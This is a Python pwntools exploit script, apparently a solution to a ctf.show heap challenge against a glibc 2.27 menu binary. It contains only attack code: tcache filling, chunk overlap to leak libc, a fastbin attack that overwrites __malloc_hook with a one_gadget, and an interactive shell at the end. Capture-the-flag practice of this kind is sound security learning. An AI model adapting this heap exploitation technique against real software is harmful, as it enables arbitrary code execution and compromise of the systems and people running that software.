from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
#io = remote('127.0.0.1',10000)
io = remote('pwn.challenge.ctf.show',28246)
elf = ELF('./pwn')
libc = ELF('/home/bit/libc/64bit/libc-2.27.so')
def choice(c):
    io.recvuntil(':')
    io.sendline(str(c))
def add(size,content):
    choice(1)
    io.recvuntil(':')
    io.sendline(str(size))
    io.recvuntil(':')
    io.sendline(content)
def show(idx):
    choice(2)
    io.recvuntil(':')
    io.sendline(str(idx))
def free(idx):
    choice(3)
    io.recvuntil(':')
    io.sendline(str(idx))
add(0xa0,'AAA')
add(0x18,'AAA')
add(0xf0,'SSSS')
add(0xc8,'NNNN')#3
add(0xa0,'aa')
add(0x68,'AAA')
add(0xf0,'AAA')
for i in range(7):
    add(0xa0,'A')
for i in range(7):
    add(0xf0,'A')
for i in range(7):
    add(0x10,'A')
for i in range(21):
    free(i+7)
for i in range(7):
    add(0x60,'t')
for i in range(7):
    free(i+7)
free(0)
free(1)
add(0x18,'A'*0x10+p64(0xd0))
        
free(2)
add(0xa0,'B')#1
show(0)
leak = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = leak - 0x3ebca0
one_gadget = libc_base + 0x4f302
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
malloc_hook = libc_base + libc.sym['__malloc_hook']
free(4)
free(5)
add(0x68,'A'*0x60+p64(0x120))
free(2)
free(6)
add(0xc0,'A')
add(0x40,'A')
add(0xc0,'A'*0xa0+p64(0)+p64(0x70)+p64(malloc_hook-0x23))
add(0x60,'A')
add(0x60,'A'*0x13+p64(one_gadget))
io.recvuntil(':')
io.sendline('1')
io.recvuntil(':')
io.sendline('20')
io.interactive()
